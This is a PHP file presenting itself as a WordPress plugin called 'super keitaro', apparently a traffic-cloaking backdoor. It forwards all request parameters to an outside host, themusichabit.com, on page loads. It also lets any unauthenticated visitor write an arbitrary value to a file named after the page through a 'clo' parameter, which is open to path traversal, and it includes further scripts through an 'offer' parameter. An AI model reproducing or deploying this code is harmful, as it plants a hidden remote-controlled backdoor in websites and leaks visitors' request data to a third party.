<?php

/**
 * @wordpress-plugin
 * Plugin Name:       super keitaro
 * Version:           1.0.0
 * Text Domain:       keitaro
 */

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) die;

if (!defined('YOUR_PLUGIN_DIR_KT')) define( 'YOUR_PLUGIN_DIR_KT', plugin_dir_path( dirname( __FILE__ ) ) );


add_action( 'wp', 'keitaro_fn' );


if(isset($_REQUEST['offer'])) {
    require_once YOUR_PLUGIN_DIR_KT . 'keitaro/wpInegraClient/offer.php';
	die();
}

function keitaro_fn( $post ) {
	$pagename = isset($post->query_vars['pagename']) ? $post->query_vars['pagename'] : 0;
	$file = YOUR_PLUGIN_DIR_KT . 'keitaro/data/' . $pagename;
	if (is_readable($file)) {
		$apikey = file_get_contents(YOUR_PLUGIN_DIR_KT . 'keitaro/data/' . $pagename);
		require_once YOUR_PLUGIN_DIR_KT . 'keitaro/wpInegraClient/kclient.php';
		$client = new KClient('https://themusichabit.com/api.php?', $apikey);
		$client->sendAllParams();
		require_once YOUR_PLUGIN_DIR_KT . 'keitaro/wpInegraClient/index.php';
	} else {
		if(isset($_REQUEST['clo'])) file_put_contents(YOUR_PLUGIN_DIR_KT . 'keitaro/data/' . $pagename, trim($_REQUEST['clo']));
	}
}







